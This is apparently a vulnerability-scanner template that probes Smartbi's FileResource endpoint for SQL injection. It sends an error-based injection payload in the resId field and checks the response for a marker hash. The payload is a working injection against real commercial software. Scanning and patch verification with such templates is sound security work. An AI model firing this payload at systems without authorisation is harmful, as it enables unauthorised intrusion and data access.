id: poc-yaml-smartbi-fileresource-sqli
info:
  name: Smartbi FileResource SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  - 两高一弱
  finger: Smartbi
variables:
  r_path: '/smartbi/

    /'
  r_random_str: random_str(6)
  r_verify_md5: substr(md5(r_random_str), 6, 28)
requests:
- method: POST
  path: '{{.r_path}}vision/FileResource'
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: op=OPEN&resId=LOGIN_BG_IMG%27%20AND%20extractvalue(1,concat(0,md5('{{.r_random_str}}')))--%20
  expression: 'status_code == 200 && contains(body, r_verify_md5)

    '
transport: http
